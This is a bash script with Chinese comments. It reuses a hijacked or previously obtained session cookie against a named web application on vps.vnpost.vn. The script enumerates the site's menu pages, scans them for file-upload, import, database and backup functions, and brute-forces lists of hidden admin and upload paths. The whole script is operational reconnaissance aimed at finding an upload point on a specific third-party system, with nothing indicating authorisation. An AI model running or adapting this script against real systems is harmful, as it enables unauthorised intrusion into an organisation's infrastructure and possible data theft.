#!/bin/bash

# 使用之前成功登录的session
COOKIE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
BASE="http://vps.vnpost.vn/chamcong"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 使用有效Session深度枚举所有功能"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[1] 获取完整菜单结构"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

curl -sk "${BASE}/leftmenu.aspx" -H "Cookie: $COOKIE" -o full_menu.html 2>&1

echo "  菜单大小: $(wc -c < full_menu.html) bytes"
echo ""
echo "  提取所有链接:"

grep -oE "href=['\"]([^'\"]+)" full_menu.html | \
    sed 's/href=["'\'']//' | \
    grep -E "\.aspx" | \
    sort -u | tee all_links.txt | \
    while read link; do
        echo "    $link"
    done

link_count=$(wc -l < all_links.txt)
echo ""
echo "  发现 $link_count 个功能"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[2] 测试所有发现的功能（找上传/文件操作）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

cat all_links.txt | while read link; do
    # 构建完整URL
    if [[ $link == http* ]]; then
        url="$link"
    elif [[ $link == /* ]]; then
        url="http://vps.vnpost.vn${link}"
    else
        url="${BASE}/${link}"
    fi
    
    echo ""
    echo "  测试: $url"
    
    # 访问页面
    curl -sk "$url" \
        -H "Cookie: $COOKIE" \
        -o "func_$(echo $url | md5sum | cut -d' ' -f1).html" \
        -w "%{http_code}\n" 2>&1 | grep -E "^[0-9]{3}$" | while read code; do
        
        result_file="func_$(echo $url | md5sum | cut -d' ' -f1).html"
        size=$(wc -c < "$result_file")
        
        echo "    状态: $code, 大小: $size bytes"
        
        # 查找文件上传相关关键词
        if grep -qiE "upload|file.*input|type=['\"]file|enctype.*multipart|browse|import|nhập.*file|tải.*lên" "$result_file"; then
            echo "    🔥🔥🔥 发现文件上传功能！"
            grep -iE "upload|file.*input|type=['\"]file" "$result_file" | head -5
        fi
        
        # 查找导入功能
        if grep -qiE "import|nhập|导入" "$result_file"; then
            echo "    🔥 发现导入功能"
        fi
        
        # 查找数据库相关
        if grep -qiE "database|sql|connection|backup" "$result_file"; then
            echo "    🔥 发现数据库相关"
        fi
    done
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[3] 暴力枚举管理功能"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

ADMIN_PATHS=(
    "/chamcong/admin/upload.aspx"
    "/chamcong/admin/import.aspx"
    "/chamcong/admin/backup.aspx"
    "/chamcong/admin/export.aspx"
    "/chamcong/admin/config.aspx"
    "/chamcong/admin/database.aspx"
    "/chamcong/system/upload.aspx"
    "/chamcong/system/import.aspx"
    "/chamcong/upload/default.aspx"
    "/chamcong/import/default.aspx"
    "/chamcong/file/upload.aspx"
    "/chamcong/backup/default.aspx"
)

for path in "${ADMIN_PATHS[@]}"; do
    echo ""
    echo "  测试: $path"
    
    resp=$(curl -sk "http://vps.vnpost.vn${path}" \
        -H "Cookie: $COOKIE" \
        -w "%{http_code}" \
        -o "admin_$(basename $path .aspx).html" 2>&1)
    
    http_code=$(echo "$resp" | tail -c 4)
    size=$(wc -c < "admin_$(basename $path .aspx).html")
    
    echo "    状态: $http_code, 大小: $size"
    
    if [ "$http_code" == "200" ] && [ $size -gt 3000 ]; then
        echo "    🔥🔥🔥 200 OK！可能是隐藏功能！"
        
        # 分析内容
        if grep -qiE "upload|file|import" "admin_$(basename $path .aspx).html"; then
            echo "    🔥🔥🔥🔥🔥 发现文件操作功能！"
            head -50 "admin_$(basename $path .aspx).html"
        fi
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[4] 检查是否有其他系统"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

OTHER_SYSTEMS=(
    "/vckv/upload.aspx"
    "/vckv/admin/upload.aspx"
    "/luong/upload.aspx"
    "/luong/admin/upload.aspx"
    "/cos/upload.asp"
    "/admin/upload.aspx"
    "/system/upload.aspx"
)

for path in "${OTHER_SYSTEMS[@]}"; do
    resp=$(curl -sk "http://vps.vnpost.vn${path}" \
        -H "Cookie: $COOKIE" \
        -w "%{http_code}" \
        -o /dev/null 2>&1)
    
    http_code=$(echo "$resp" | tail -c 4)
    
    if [ "$http_code" != "404" ]; then
        echo "  🔥 $path: $http_code"
    fi
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 深度枚举完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo ""
echo "📊 最终总结:"
echo ""

echo "  发现的文件上传功能:"
grep -l "upload.*file.*input\|type=['\"]file" func_*.html admin_*.html 2>/dev/null | while read file; do
    echo "    🔥 $file"
done

echo ""
echo "  发现的200 OK管理页面:"
for file in admin_*.html; do
    if [ -f "$file" ]; then
        size=$(wc -c < "$file")
        if [ $size -gt 3000 ]; then
            echo "    🔥 $file: $size bytes"
        fi
    fi
done
